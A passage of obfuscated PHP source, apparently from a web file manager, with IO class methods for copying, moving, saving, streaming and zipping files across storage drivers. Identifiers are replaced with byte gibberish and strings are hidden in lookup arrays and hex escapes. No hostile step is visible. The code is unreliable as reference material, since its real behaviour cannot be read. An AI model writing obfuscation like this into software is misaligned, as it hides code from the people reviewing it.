@call_user_func_array(array($È“©é», $¶ßïî¶Î), $ÕóøÂƒ—); } else { if (method_exists(self, $¶ßïî¶Î)) { $èí×‚Ø¤ = @call_user_func_array(array(self, $¶ßïî¶Î), $ÕóøÂƒ—); } else { $èí×‚Ø¤ = call_user_func_array(array(parent, $¶ßïî¶Î), $ÕóøÂƒ—); } } } Hook::trigger($òêİÇ®[1233] . $¶ßïî¶Î . $òêİÇ®[1236], $Ï³¦“Àä, $èí×‚Ø¤); return $èí×‚Ø¤; } public static function init($”Çºèœ¨) { return self::driverMake($”Çºèœ¨); } public static function copy($¼ı„Åõõ, $¡¾Üğ…Û, $…‘öñ¶Ô = false, $­à¹¯´ = false) { return self::copyMoveStart($¼ı„Åõõ, $¡¾Üğ…Û, $…‘öñ¶Ô, $_SERVER[¼èá¯æÙ][632], $­à¹¯´); } public static function move($¾ßùì¿ï, $„ñØÀ¢, $Ì‚»æ„ = false, $±¸½Á–› = false) { return self::copyMoveStart($¾ßùì¿ï, $„ñØÀ¢, $Ì‚»æ„, $_SERVER[¼èá¯æÙ][634], $±¸½Á–›); } public static function copyMoveChildren($Ô€½ îÛ, $¶ÖÈ†äÓ, $Ø–Ê¶ˆŠ = "\143\x6f\x70\171", $áĞ«âÑ  = REPEAT_REPLACE) { $Ø••²‹˜ =& $_SERVER[¼èá¯æÙ]; $ÛşÇ•îÇ = $Ô€½ îÛ; $Â¿ã£ê— = self::driverMake($Ô€½ îÛ); $•í¿–İ» = $Â¿ã£ê—->listPath($Ô€½ îÛ, !0); $¥‰Æ¯”é = array_merge($•í¿–İ»[$Ø••²‹˜[96]], $•í¿–İ»[$Ø••²‹˜[95]]); foreach ($¥‰Æ¯”é as $ŠáÓÌ”) { self::copyMoveStart($ŠáÓÌ”[$Ø••²‹˜[97]], $¶ÖÈ†äÓ, $áĞ«âÑ , $Ø–Ê¶ˆŠ, !1); } if ($Ø–Ê¶ˆŠ == $Ø••²‹˜[634]) { self::remove($ÛşÇ•îÇ); } } private static function copyMoveStart($ÃµÑ™Ó¢, $¿¯·¯öƒ, $´í·™ö³, $²–Í¹¼Î, $¨èÚ²§) { $óŠ¢ÔŞš =& $_SERVER[¼èá¯æÙ]; $Õ½à¶ÄÉ = array($ÃµÑ™Ó¢, $¿¯·¯öƒ, $´í·™ö³, $¨èÚ²§); Hook::trigger($óŠ¢ÔŞš[1233] . $²–Í¹¼Î . $óŠ¢ÔŞš[1234], $Õ½à¶ÄÉ); $×—è¡‚© = self::copyMove($ÃµÑ™Ó¢, $¿¯·¯öƒ, $´í·™ö³, $²–Í¹¼Î, $¨èÚ²§); Hook::trigger($óŠ¢ÔŞš[1233] . $²–Í¹¼Î . $óŠ¢ÔŞš[1236], $Õ½à¶ÄÉ, $×—è¡‚©); return $×—è¡‚©; } public static function saveFile($ÈŠ‹Èûå, $îê’Ü, $íŞ•Ò³ğ = true) { $—øÖö… =& $_SERVER[¼èá¯æÙ]; $íß ŠÉ® = self::info($îê’Ü); $Š³œœ£Ê = self::driverMake($ÈŠ‹Èûå); $æáÆîë… = self::driverMake($îê’Ü); $†„­ÈÛ = !1; if ($æáÆîë…->pathParse[$—øÖö…[1237]]) { $†„­ÈÛ = $æáÆîë…; $ü®ûÄ€¯ = $æáÆîë…->pathParse[$—øÖö…[1237]]; $æáÆîë… = self::driverMake($ü®ûÄ€¯); } if ($Š³œœ£Ê->pathParse[$—øÖö…[1237]]) { $îä‡Û¾‘ = $Š³œœ£Ê->pathParse[$—øÖö…[1237]]; $Š³œœ£Ê = self::driverMake($îä‡Û¾‘); } $ìÏáË†¹ = $æáÆîë…->pathFather($îê’Ü); $«Ê€èŸù = !0; if (!$íŞ•Ò³ğ && self::driverIsSame($Š³œœ£Ê, $æáÆîë…)) { $«Ê€èŸù = !1; } $Ìğ†áá¹ = self::copyFile($Š³œœ£Ê, $ÈŠ‹Èûå, $æáÆîë…, $ìÏáË†¹, $íß ŠÉ®[$—øÖö…[32]], $«Ê€èŸù); if ($†„­ÈÛ) { $Ìğ†áá¹ = $†„­ÈÛ->getPathOuter($Ìğ†áá¹); } return $Ìğ†áá¹; } private static function copyMove($´ÄîÆæğ, $ğèê¤Ê¸, $ú†›‚ÎÊ, $åü¾¹¥®, $×Ñ£ëÉª = false) { $üİ÷º¬± =& $_SERVER[¼èá¯æÙ]; if (!$´ÄîÆæğ || $´ÄîÆæğ == $üİ÷º¬±[8] || !$ğèê¤Ê¸) { return !1; } ignore_timeout(); $ØÜÒÌ¥° = self::driverMake($´ÄîÆæğ); $¼æ§Õ«§ = self::driverMake($ğèê¤Ê¸); $êÅ¡×­Í = $åü¾¹¥® == $üİ÷º¬±[634]; $Ì´’ÎÊ´ = !1; if ($¼æ§Õ«§->pathParse[$üİ÷º¬±[1237]]) { $Ì´’ÎÊ´ = $¼æ§Õ«§; $ğèê¤Ê¸ = $¼æ§Õ«§->pathParse[$üİ÷º¬±[1237]]; $¼æ§Õ«§ = self::driverMake($ğèê¤Ê¸); } if ($ØÜÒÌ¥°->pathParse[$üİ÷º¬±[1237]]) { $´ÄîÆæğ = $ØÜÒÌ¥°->pathParse[$üİ÷º¬±[1237]]; $ØÜÒÌ¥° = self::driverMake($´ÄîÆæğ); } self::check($ØÜÒÌ¥°, $´ÄîÆæğ, $¼æ§Õ«§, $ğèê¤Ê¸); Hook::trigger($üİ÷º¬±[1238], $ØÜÒÌ¥°, $´ÄîÆæğ, $¼æ§Õ«§, $ğèê¤Ê¸); $â°¬¹öŠ = self::driverIsSame($ØÜÒÌ¥°, $¼æ§Õ«§); if ($â°¬¹öŠ) { if ($åü¾¹¥® == $üİ÷º¬±[634] && !method_exists($¼æ§Õ«§, $üİ÷º¬±[1239]) && trim($ğèê¤Ê¸, $üİ÷º¬±[8]) == trim($¼æ§Õ«§->pathFather($´ÄîÆæğ), $üİ÷º¬±[8])) { if ($ØÜÒÌ¥°->pathThis($´ÄîÆæğ) != $×Ñ£ëÉª && !$ØÜÒÌ¥°->isOsDriver()) { return $ØÜÒÌ¥°->rename($´ÄîÆæğ, $×Ñ£ëÉª); } return $¼æ§Õ«§->getPathOuter($´ÄîÆæğ); } if (method_exists($¼æ§Õ«§, $åü¾¹¥®)) { return $¼æ§Õ«§->{$åü¾¹¥®}($´ÄîÆæğ, $ğèê¤Ê¸, $ú†›‚ÎÊ, $×Ñ£ëÉª); } } if ($â°¬¹öŠ && $åü¾¹¥® == $üİ÷º¬±[634] && $¼æ§Õ«§->getType() == $üİ÷º¬±[119]) { $æªı¨Œ® = $¼æ§Õ«§->movePath($´ÄîÆæğ, $ğèê¤Ê¸, $×Ñ£ëÉª); if ($æªı¨Œ®) { return $æªı¨Œ®; } } $‚ãæ½™Ÿ = $ØÜÒÌ¥°->isFile($´ÄîÆæğ); if (!$‚ãæ½™Ÿ && $¼æ§Õ«§->getType() == $üİ÷º¬±[839] && $ØÜÒÌ¥°->getType() == $üİ÷º¬±[119]) { $æªı¨Œ® = $¼æ§Õ«§->copyFolderFromIO($ØÜÒÌ¥°, $´ÄîÆæğ, $ğèê¤Ê¸, $ú†›‚ÎÊ, $êÅ¡×­Í, $×Ñ£ëÉª); } else { $æªı¨Œ® = self::copyPath($ØÜÒÌ¥°, $´ÄîÆæğ, $¼æ§Õ«§, $ğèê¤Ê¸, $ú†›‚ÎÊ, $êÅ¡×­Í, $‚ãæ½™Ÿ, $×Ñ£ëÉª); } if ($æªı¨Œ® && $êÅ¡×­Í) { $ØÜÒÌ¥°->remove($´ÄîÆæğ); } if ($Ì´’ÎÊ´) { $æªı¨Œ® = $Ì´’ÎÊ´->getPathOuter($æªı¨Œ®); } return $æªı¨Œ®; } private static function check($òß¶Ïøù, $è¢ÎÜİß, $›šìë, &$ÚÉº) { $…²ÙÅ…‡ =& $_SERVER[¼èá¯æÙ]; if (self::driverIsSame($òß¶Ïøù, $›šìë) && $òß¶Ïøù->isFolder($è¢ÎÜİß) && $òß¶Ïøù->isParentOf($è¢ÎÜİß, $ÚÉº)) { show_json(LNG($…²ÙÅ…‡[1240]), !1); } if (!$òß¶Ïøù->exist($è¢ÎÜİß)) { show_json(LNG($…²ÙÅ…‡[118]), !1); } } private static function copyPath($œÀñÀô, $‰¬™Ô¢›, $ÏÊ»Ïà¸, $Ô“¿ÔÀ, $à¥€¿ä¨, $Ç”‡¸¶˜, $Ö¼Ú³Ú×, $·õ›ÈşÃ = false, $ÕÊÛÏ¶Ş = true) { $¿Ö§§¾Ù =& $_SERVER[¼èá¯æÙ]; $ä¾å·¬— = empty($·õ›ÈşÃ) && $·õ›ÈşÃ !== $¿Ö§§¾Ù[240] ? $œÀñÀô->pathThis($‰¬™Ô¢›) : $·õ›ÈşÃ; if ($à¥€¿ä¨) { $’Ÿ¨‰·Ê = $ÏÊ»Ïà¸->fileNameExist($Ô“¿ÔÀ, $ä¾å·¬—); $ıåñˆ³ = $ä¾å·¬—; $ä¾å·¬— = $ÏÊ»Ïà¸->fileNameAuto($Ô“¿ÔÀ, $ä¾å·¬—, $à¥€¿ä¨, !$Ö¼Ú³Ú×); if (!$’Ÿ¨‰·Ê || $ıåñˆ³ != $ä¾å·¬—) { $à¥€¿ä¨ = !1; } if ($ÕÊÛÏ¶Ş && !$à¥€¿ä¨) { $ÏÊ»Ïà¸->_data[$¿Ö§§¾Ù[1241]] = !0; } } if ($Ö¼Ú³Ú×) { return self::copyFile($œÀñÀô, $‰¬™Ô¢›, $ÏÊ»Ïà¸, $Ô“¿ÔÀ, $ä¾å·¬—, $Ç”‡¸¶˜); } if ($à¥€¿ä¨ == REPEAT_RENAME_FOLDER) { $à¥€¿ä¨ = !1; } $´ßÎË™ß = rtrim($Ô“¿ÔÀ, $¿Ö§§¾Ù[8]) . $¿Ö§§¾Ù[8] . $ä¾å·¬—; $ø—Ô•ÓŞ = $ÏÊ»Ïà¸->mkdir($ÏÊ»Ïà¸->getPath($´ßÎË™ß), $à¥€¿ä¨); $Ô“¿ÔÀ = $ÏÊ»Ïà¸->getPathInner($ø—Ô•ÓŞ); $ÈùÁğÌµ = $œÀñÀô->listPath($‰¬™Ô¢›, !0); $ÈùÁğÌµ = is_array($ÈùÁğÌµ) ? $ÈùÁğÌµ : array($¿Ö§§¾Ù[96] => array(), $¿Ö§§¾Ù[95] => array()); $õ÷±ÇÌ = array_merge($ÈùÁğÌµ[$¿Ö§§¾Ù[96]], $ÈùÁğÌµ[$¿Ö§§¾Ù[95]]); foreach ($õ÷±ÇÌ as $¢‚°ªŒÃ) { $ˆ¥õØ™ = $¢‚°ªŒÃ[$¿Ö§§¾Ù[33]] == $¿Ö§§¾Ù[242]; $‰¬™Ô¢› = $œÀñÀô->getPathInner($¢‚°ªŒÃ[$¿Ö§§¾Ù[97]]); $ª¼©Ğ»ï = self::copyPath($œÀñÀô, $‰¬™Ô¢›, $ÏÊ»Ïà¸, $Ô“¿ÔÀ, $à¥€¿ä¨, $Ç”‡¸¶˜, $ˆ¥õØ™, !1, !1); if (!$ª¼©Ğ»ï) { IO::errorTips($¿Ö§§¾Ù[1242] . $‰¬™Ô¢› . $¿Ö§§¾Ù[83] . $Ô“¿ÔÀ); } } self::copyMoveKeepInfo($œÀñÀô, $‰¬™Ô¢›, $ø—Ô•ÓŞ); return $ø—Ô•ÓŞ; } private static function copyFile($òŞéú×, $áÈ´ÒÊí, $ –‚‘ü§, $Å²èîüî, $Ü¦µÌ…ú, $Á»Äç‹) { $×ĞÑ®ÄÑ =& $_SERVER[¼èá¯æÙ]; $Å²èîüî = $ –‚‘ü§->getPath(rtrim($Å²èîüî, $×ĞÑ®ÄÑ[8]) . $×ĞÑ®ÄÑ[8] . $Ü¦µÌ…ú); $ÕØÜºØô = $×ĞÑ®ÄÑ[1243] . time() . rand_string(5); Hook::trigger($×ĞÑ®ÄÑ[1244], $òŞéú×, $áÈ´ÒÊí, $ –‚‘ü§, $Å²èîüî, $Ü¦µÌ…ú, $ÕØÜºØô); if (self::driverIsSame($òŞéú×, $ –‚‘ü§)) { if ($Á»Äç‹) { $ª“Øä×¶ = $ –‚‘ü§->moveFile($áÈ´ÒÊí, $Å²èîüî); } else { $ª“Øä×¶ = $ –‚‘ü§->copyFile($áÈ´ÒÊí, $Å²èîüî); } Hook::trigger($×ĞÑ®ÄÑ[1245], $òŞéú×, $áÈ´ÒÊí, $ –‚‘ü§, $Å²èîüî, $Ü¦µÌ…ú, $ª“Øä×¶); self::copyMoveKeepInfo($òŞéú×, $áÈ´ÒÊí, $ª“Øä×¶); return $ª“Øä×¶; } $ßÅæëÚ™ = TEMP_FILES; if ($GLOBALS[$×ĞÑ®ÄÑ[6]][$×ĞÑ®ÄÑ[102]][$×ĞÑ®ÄÑ[879]]) { $ßÅæëÚ™ = $GLOBALS[$×ĞÑ®ÄÑ[6]][$×ĞÑ®ÄÑ[102]][$×ĞÑ®ÄÑ[879]]; } $ªú“¸›Ÿ = $ßÅæëÚ™; mk_dir($ªú“¸›Ÿ); $¦°²œ‚İ = $ªú“¸›Ÿ . $ÕØÜºØô; $±şêï½ï = $¦°²œ‚İ; $¦°²œ‚İ = $òŞéú×->download($áÈ´ÒÊí, $¦°²œ‚İ); $¦°²œ‚İ = $òŞéú×->iconvApp($¦°²œ‚İ); if (substr($¦°²œ‚İ, strlen($ßÅæëÚ™)) == $ßÅæëÚ™) { $Á»Äç‹ = !0; } $ª“Øä×¶ = $ –‚‘ü§->upload($Å²èîüî, $¦°²œ‚İ, $Á»Äç‹); self::remove($±şêï½ï); Hook::trigger($×ĞÑ®ÄÑ[1245], $òŞéú×, $áÈ´ÒÊí, $ –‚‘ü§, $Å²èîüî, $Ü¦µÌ…ú, $ª“Øä×¶); self::copyMoveKeepInfo($òŞéú×, $áÈ´ÒÊí, $ª“Øä×¶); return $ª“Øä×¶; } private static function copyMoveKeepInfo($Òå†‚¦à, $ …ò›±î, $½™¢†ÁÍ) { if (!$½™¢†ÁÍ) { return; } $Şª²‰ = $Òå†‚¦à->info($ …ò›±î); if (!is_array($Şª²‰)) { return; } IO::setModifyTime($½™¢†ÁÍ, $Şª²‰[$_SERVER[¼èá¯æÙ][98]]); } public static function pathFather($¶Ğ£ÎÑÛ) { $¢Âıú¢© = IO::init($¶Ğ£ÎÑÛ); $½µ«ªŠ = $¢Âıú¢©->pathFather($¢Âıú¢©->path); return $¢Âıú¢©->getPathOuter($½µ«ªŠ); } public static function fileOut($ø†Ú“çÆ, $ØÂ‹¸ñ¬ = false, $úúÀÌàå = false, $ÍˆÄ…™ = '') { $€‘Šşã­ = self::driverMake($ø†Ú“çÆ); if ($€‘Šşã­->isFileOutServer()) { return $€‘Šşã­->fileOutServer($ø†Ú“çÆ, $ØÂ‹¸ñ¬, $úúÀÌàå, $ÍˆÄ…™); } return $€‘Šşã­->fileOut($ø†Ú“çÆ, $ØÂ‹¸ñ¬, $úúÀÌàå, $ÍˆÄ…™); } public static function fileOutImage($ËøñøÕ¶, $ù³º¦Ù– = 250) { $¬†¾´ = array(250, 600, 1200, 2000, 3000, 5000); for ($Å™Š’ë§ = 0; $Å™Š’ë§ < count($¬†¾´); $Å™Š’ë§++) { if ($Å™Š’ë§ == 0 && $ù³º¦Ù– <= $¬†¾´[$Å™Š’ë§]) { $ù³º¦Ù– = $¬†¾´[$Å™Š’ë§]; break; } else { if ($ù³º¦Ù– > $¬†¾´[$Å™Š’ë§ - 1] && $ù³º¦Ù– <= $¬†¾´[$Å™Š’ë§]) { $ù³º¦Ù– = $¬†¾´[$Å™Š’ë§]; break; } else { if ($Å™Š’ë§ == count($¬†¾´) - 1 && $ù³º¦Ù– > $¬†¾´[$Å™Š’ë§]) { $ù³º¦Ù– = $¬†¾´[$Å™Š’ë§]; break; } } } } $íï¼â¶ş = self::driverMake($ËøñøÕ¶); if ($íï¼â¶ş->isFileOutServer()) { return $íï¼â¶ş->fileOutImageServer($ËøñøÕ¶, $ù³º¦Ù–); } return $íï¼â¶ş->fileOutImage($ËøñøÕ¶, $ù³º¦Ù–); } private static function driverIsSame($¯¤ŞâªŞ, $¡±íÅ—‘) { $ö•š¡şÀ =& $_SERVER[¼èá¯æÙ]; $úğı˜Ô = $¯¤ŞâªŞ->getType(); $°ÂÉ×Ã¡ = $¡±íÅ—‘->getType(); if ($úğı˜Ô != $°ÂÉ×Ã¡) { return !1; } if ($úğı˜Ô == $ö•š¡şÀ[839]) { return !0; } if ($úğı˜Ô == $ö•š¡şÀ[119]) { return !0; } if ($¯¤ŞâªŞ->pathDriver == $¡±íÅ—‘->pathDriver) { return !0; } return !1; } public static function copyUpdate($ší¸¥Ï, $ƒç®ù¬•) { $‰êø˜Ë =& $_SERVER[¼èá¯æÙ]; if (!IO::exist($ší¸¥Ï)) { return !1; } if (!IO::exist($ƒç®ù¬•)) { IO::mkdir($ƒç®ù¬•); } $ÖÌİ³éí = array_to_keyvalue(self::listAllSimple($ší¸¥Ï), $‰êø˜Ë[97]); $¼ãæøé = array_to_keyvalue(self::listAllSimple($ƒç®ù¬•), $‰êø˜Ë[97]); $Û†æ†Şë = array(); $÷Ë½ñ¾ç = array(); foreach ($ÖÌİ³éí as $€îùÀªÇ => $èÏğß¨) { if (isset($¼ãæøé[$€îùÀªÇ])) { if ($èÏğß¨[$‰êø˜Ë[88]] == 1) { continue; } if ($¼ãæøé[$€îùÀªÇ][$‰êø˜Ë[89]] == $èÏğß¨[$‰êø˜Ë[89]]) { continue; } } if ($èÏğß¨[$‰êø˜Ë[88]] == 1) { $÷Ë½ñ¾ç[] = $ƒç®ù¬• . $‰êø˜Ë[8] . trim($€îùÀªÇ, $‰êø˜Ë[8]); continue; } $ê¡¹«ñˆ = strstr(trim($€îùÀªÇ, $‰êø˜Ë[8]), $‰êø˜Ë[8]) ? get_path_father($€îùÀªÇ) : $‰êø˜Ë[12]; $Û†æ†Şë[] = array($‰êø˜Ë[1246] => $èÏğß¨[$‰êø˜Ë[99]], $‰êø˜Ë[1247] => rtrim($ƒç®ù¬•, $‰êø˜Ë[8]) . $‰êø˜Ë[8] . $ê¡¹«ñˆ, $‰êø˜Ë[1248] => $èÏğß¨); } $ªıèìÑò = array($‰êø˜Ë[242] => $Û†æ†Şë, $‰êø˜Ë[88] => $÷Ë½ñ¾ç); Hook::trigger($‰êø˜Ë[1249], $ší¸¥Ï, $ƒç®ù¬•, $ªıèìÑò); foreach ($÷Ë½ñ¾ç as $èÏğß¨) { IO::mkdir($èÏğß¨); } foreach ($Û†æ†Şë as $èÏğß¨) { IO::copy($èÏğß¨[$‰êø˜Ë[1246]], $èÏğß¨[$‰êø˜Ë[1247]], REPEAT_REPLACE); } } public static function fileSubstr($ø£ˆ¥‹€, $Ñûñêşè, $£§Å›£Æ = false) { $Ë‰’˜Í› =& $_SERVER[¼èá¯æÙ]; $Ş ¡ü˜ = self::driverMake($ø£ˆ¥‹€); $ºãœú‚Ğ = $Ş ¡ü˜->size($ø£ˆ¥‹€); $ß¥ÚÁÓ¸ = $Ñûñêşè; $Ã»¹¤áù = $£§Å›£Æ; if ($Ñûñêşè < 0) { $Ñûñêşè = $ºãœú‚Ğ + $Ñûñêşè; } if ($£§Å›£Æ === !1) { $£§Å›£Æ = $ºãœú‚Ğ - $Ñûñêşè; } if ($Ñûñêşè + $£§Å›£Æ > $ºãœú‚Ğ) { $£§Å›£Æ = $ºãœú‚Ğ - $Ñûñêşè; } if (!$ºãœú‚Ğ && $Ş ¡ü˜->getType() == $Ë‰’˜Í›[119] && !$Ş ¡ü˜->exist($ø£ˆ¥‹€)) { $À¡»Á·İ = get_path_this($ø£ˆ¥‹€); $ÂÑè×Šé = parse_url_query($À¡»Á·İ); if (is_array($ÂÑè×Šé) && isset($ÂÑè×Šé[$Ë‰’˜Í›[32]])) { $À¡»Á·İ = urldecode($ÂÑè×Šé[$Ë‰’˜Í›[32]]); } throw new Exception($Ë‰’˜Í›[1250] . LNG($Ë‰’˜Í›[1251]) . $Ë‰’˜Í›[1048] . clear_html($À¡»Á·İ) . $Ë‰’˜Í›[12]); } if ($£§Å›£Æ <= 0) { return $Ë‰’˜Í›[12]; } if ($Ñûñêşè < 0 || $Ñûñêşè >= $ºãœú‚Ğ || $£§Å›£Æ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\x52\x65\141\x64\x20\x65\x72\162\x6f\x72\41\x20\163\x74\x61\162\164\75{$Ñûñêşè}\x3b\x6c\x65\x6e\147\164\150\x3d{$£§Å›£Æ}\x3b\40\x73\151\x7a\145\x3d{$ºãœú‚Ğ}\x3b"); } $©ë´Ïæ = $Ş ¡ü˜->fileSubstr($ø£ˆ¥‹€, $Ñûñêşè, $£§Å›£Æ); if (!$©ë´Ïæ && $£§Å›£Æ && isset($GLOBALS[$Ë‰’˜Í›[1252]])) { throw new Exception($GLOBALS[$Ë‰’˜Í›[1252]][$Ë‰’˜Í›[1253]]); } return $©ë´Ïæ; } private static function driverMake(&$¯˜†¿ã) { $¹ÃâğßŞ =& $_SERVER[¼èá¯æÙ]; $Îˆİ”²ç = KodIO::parse($¯˜†¿ã); if (!self::$driverListSystem) { $Ò»ÆÆ“· = Model($¹ÃâğßŞ[849])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ò»ÆÆ“·, $¹ÃâğßŞ[486]); } if ($Îˆİ”²ç[$¹ÃâğßŞ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Îˆİ”²ç[$¹ÃâğßŞ[486]]]) { throw new Exception($¹ÃâğßŞ[1254]); return !1; } $¯˜†¿ã = $Îˆİ”²ç[$¹ÃâğßŞ[1255]]; $›¾ºÒ÷¦ = self::driverGet($Îˆİ”²ç, $¯˜†¿ã); return $›¾ºÒ÷¦; } private static function driverGet($ô®‘‚è , &$¶å†ƒ¯£) { $ïº˜‡¥í =& $_SERVER[¼èá¯æÙ]; $¯é•ó„ = $ô®‘‚è [$ïº˜‡¥í[1256]]; $ÅÔ‚©¿î = $ô®‘‚è [$ïº˜‡¥í[486]]; switch ($ô®‘‚è [$ïº˜‡¥í[33]]) { case KodIO::KOD_IO: $İµÀ’È = self::$driverListSystem[$ÅÔ‚©¿î]; break; case KodIO::KOD_SOURCE: $¶å†ƒ¯£ = $ÅÔ‚©¿î . $¶å†ƒ¯£; $İµÀ’È = array($ïº˜‡¥í[1257] => $ïº˜‡¥í[1258], $ïº˜‡¥í[6] => $ô®‘‚è ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Æ‹øËÎ¶ = $GLOBALS[$ïº˜‡¥í[1259]]; self::$driverListUser = array_to_keyvalue($Æ‹øËÎ¶, $ïº˜‡¥í[486]); } $İµÀ’È = self::$driverListUser[$ÅÔ‚©¿î]; break; case KodIO::KOD_SHARE_LINK: $İµÀ’È = array($ïº˜‡¥í[1257] => $ïº˜‡¥í[1260], $ïº˜‡¥í[6] => $ô®‘‚è ); $ÈØÈëËô = Action($ïº˜‡¥í[1261])->sharePathInfo($ô®‘‚è [$ïº˜‡¥í[97]]); $¶å†ƒ¯£ = $ÈØÈëËô[$ïº˜‡¥í[203]]; if (!$ÈØÈëËô[$ïº˜‡¥í[203]]) { $ŸãİÔï = Model($ïº˜‡¥í[678])->getInfo($ÈØÈëËô[$ïº˜‡¥í[679]]); $¶å†ƒ¯£ = KodIO::clear($ŸãİÔï[$ïº˜‡¥í[1262]] . $ô®‘‚è [$ïº˜‡¥í[1255]]); $ô®‘‚è [$ïº˜‡¥í[571]] = $ŸãİÔï; $ô®‘‚è [$ïº˜‡¥í[1237]] = $¶å†ƒ¯£; $İµÀ’È = array($ïº˜‡¥í[1257] => $ïº˜‡¥í[1263], $ïº˜‡¥í[6] => $ô®‘‚è ); } break; case KodIO::KOD_SHARE_ITEM: $İµÀ’È = array($ïº˜‡¥í[1257] => $ïº˜‡¥í[1264], $ïº˜‡¥í[6] => $ô®‘‚è ); $ŸãİÔï = Model($ïº˜‡¥í[678])->getInfo($ô®‘‚è [$ïº˜‡¥í[486]]); if ($ŸãİÔï[$ïº˜‡¥í[203]] == $ïº˜‡¥í[240]) { $¶å†ƒ¯£ = KodIO::clear($ŸãİÔï[$ïº˜‡¥í[1262]] . $ô®‘‚è [$ïº˜‡¥í[1255]]); $ô®‘‚è [$ïº˜‡¥í[571]] = $ŸãİÔï; $ô®‘‚è [$ïº˜‡¥í[1237]] = $¶å†ƒ¯£; $İµÀ’È = array($ïº˜‡¥í[1257] => $ïº˜‡¥í[1265], $ïº˜‡¥í[6] => $ô®‘‚è ); } else { if (!$¶å†ƒ¯£) { $¶å†ƒ¯£ = $ŸãİÔï[$ïº˜‡¥í[203]]; } } break; default: $¶å†ƒ¯£ = $ô®‘‚è [$ïº˜‡¥í[97]]; $İµÀ’È = array($ïº˜‡¥í[1257] => $ïº˜‡¥í[1266]); break; } $Çå¾ó¼‡ = $ô®‘‚è [$ïº˜‡¥í[97]]; if (!isset(self::$driverCache[$Çå¾ó¼‡])) { $ĞÄ¦íõ = strtolower($İµÀ’È[$ïº˜‡¥í[108]]); $Å•·Ö = $GLOBALS[$ïº˜‡¥í[6]][$ïº˜‡¥í[102]][$ïº˜‡¥í[908]]; $¥â¹ş— = $ïº˜‡¥í[87] . (isset($Å•·Ö[$ĞÄ¦íõ]) ? $Å•·Ö[$ĞÄ¦íõ] : ucfirst($ĞÄ¦íõ)); if (!class_exists($¥â¹ş—)) { show_json("{$¥â¹ş—}\x20\x6e\157\x74\40\x65\170\151\x73\164\163\41", !1); } $¸ÄãØŸÌ = isset($İµÀ’È[$ïº˜‡¥í[6]]) ? $İµÀ’È[$ïº˜‡¥í[6]] : !1; self::$driverCache[$Çå¾ó¼‡] = new $¥â¹ş—($¸ÄãØŸÌ); } $—´Ôˆåí = self::$driverCache[$Çå¾ó¼‡]; $—´Ôˆåí->pathDriver = $¯é•ó„; $—´Ôˆåí->pathBase = $ïº˜‡¥í[12]; if (isset($İµÀ’È[$ïº˜‡¥í[6]][$ïº˜‡¥í[1267]])) { $—´Ôˆåí->pathBase = rtrim($İµÀ’È[$ïº˜‡¥í[6]][$ïº˜‡¥í[1267]], $ïº˜‡¥í[8]) . $ïº˜‡¥í[8]; $¶å†ƒ¯£ = $—´Ôˆåí->pathBase . ltrim($¶å†ƒ¯£, $ïº˜‡¥í[8]); } $¶å†ƒ¯£ = $—´Ôˆåí->getPath($¶å†ƒ¯£); if (isset($ô®‘‚è [$ïº˜‡¥í[1237]])) { $¶å†ƒ¯£ = $ô®‘‚è [$ïº˜‡¥í[1237]]; } $—´Ôˆåí->path = $¶å†ƒ¯£; return $—´Ôˆåí; } public static function errorTips($µÓê¡€Ú = false) { $şÌ­ŠÊ =& $_SERVER[¼èá¯æÙ]; static $ªäåë„ = array(); $—ŠŸ ÀÂ = 1000; if ($µÓê¡€Ú === -1) { return $ªäåë„ ? $ªäåë„[count($ªäåë„) - 1] : $şÌ­ŠÊ[12]; } if ($µÓê¡€Ú === !1) { return implode($şÌ­ŠÊ[59], $ªäåë„); } if (count($ªäåë„) >= $—ŠŸ ÀÂ) { $ªäåë„ = array_slice($ªäåë„, $—ŠŸ ÀÂ * 0.5, $—ŠŸ ÀÂ); } $ªäåë„[] = $µÓê¡€Ú; write_log($şÌ­ŠÊ[186] . ACTION . $şÌ­ŠÊ[1268] . $µÓê¡€Ú, $şÌ­ŠÊ[1269]); } public static function getLastError($ƒñÛƒ¨¸ = '') { $ˆüø¶ = self::errorTips(-1); return $ˆüø¶ ? $ˆüø¶ : $ƒñÛƒ¨¸; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $úÎ³ÀÀÍ; if ($úÎ³ÀÀÍ) { return $úÎ³ÀÀÍ; } $ô¢˜ñ©Ñ = IO::init($_SERVER[¼èá¯æÙ][8]); return $ô¢˜ñ©Ñ; } private static function iconvSystem($—§¬®¥¾) { return self::local()->iconvSystem($—§¬®¥¾); } private static function iconvApp($şêÂ¬¤Ì) { return self::local()->iconvApp($şêÂ¬¤Ì); } public static function zipFolder($ß›±Ë…ğ, $›æü€Š = "\x7a\x69\160", $µ™á³Üø = '', $ÒîİÈª¤ = REPEAT_RENAME) { $çéŒÜéœ =& $_SERVER[¼èá¯æÙ]; $å¦»Áß = IO::listPath($ß›±Ë…ğ); if (!$å¦»Áß) { return !1; } $å¦»Áß = array_merge($å¦»Áß[$çéŒÜéœ[95]], $å¦»Áß[$çéŒÜéœ[96]]); return self::zip($å¦»Áß, $›æü€Š, $µ™á³Üø, $ÒîİÈª¤); } public static function zip($‹È¦ú‰®, $…’ë¥Ä¤ = "\x7a\x69\x70", $·ÃÛìáÒ = '', $õ™ëìâÄ = REPEAT_RENAME) { $¦¯À½œ =& $_SERVER[¼èá¯æÙ]; if (is_string($‹È¦ú‰®) && $‹È¦ú‰®) { $‹È¦ú‰® = array(array($¦¯À½œ[97] => $‹È¦ú‰®)); } $ßÒ»·°  = self::init($‹È¦ú‰®[0][$¦¯À½œ[97]]); $ÅÜôåÜÄ = self::info($‹È¦ú‰®[0][$¦¯À½œ[97]]); $ƒ¼¼Ë = $¦¯À½œ[12]; $ÊêˆÇ¿¢ = $¦¯À½œ[12]; $ÔŒ ¦ùÉ = $¦¯À½œ[12]; if ($·ÃÛìáÒ && substr($·ÃÛìáÒ, -1, 1) != $¦¯À½œ[8]) { $ÊêˆÇ¿¢ = get_path_father($·ÃÛìáÒ); $ÔŒ ¦ùÉ = get_path_this($·ÃÛìáÒ); } else { $ÊêˆÇ¿¢ = self::pathFather($ÅÜôåÜÄ[$¦¯À½œ[97]]); $ÔŒ ¦ùÉ = $ÅÜôåÜÄ[$¦¯À½œ[32]] . $¦¯À½œ[10] . $…’ë¥Ä¤; if (count($‹È¦ú‰®) > 1) { $”Ø ºû = IO::info($ÊêˆÇ¿¢); $ÔŒ 